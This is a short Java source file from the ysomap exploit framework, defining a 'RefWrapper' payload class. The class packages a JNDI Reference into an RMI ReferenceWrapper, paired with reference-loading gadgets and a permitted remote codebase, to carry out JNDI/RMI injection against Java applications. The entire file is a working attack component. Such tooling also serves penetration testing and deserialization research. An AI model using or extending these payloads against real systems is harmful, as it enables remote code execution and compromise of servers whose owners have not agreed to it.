package ysomap.core.payload.java.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.rmi.RefBullet;

import javax.naming.Reference;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@SuppressWarnings({"rawtypes"})
@Payloads
@Require(bullets = {"TomcatRefBullet","RefBullet"})
@Dependencies({"allowed jndi remote codebase"})
@Authors({ Authors.WH1T3P1G })
public class RefWrapper extends Payload<ReferenceWrapper> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof Reference;
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new RefBullet();
    }

    @Override
    public ReferenceWrapper pack(Object obj) throws Exception {
        return new ReferenceWrapper((Reference) obj);
    }
}
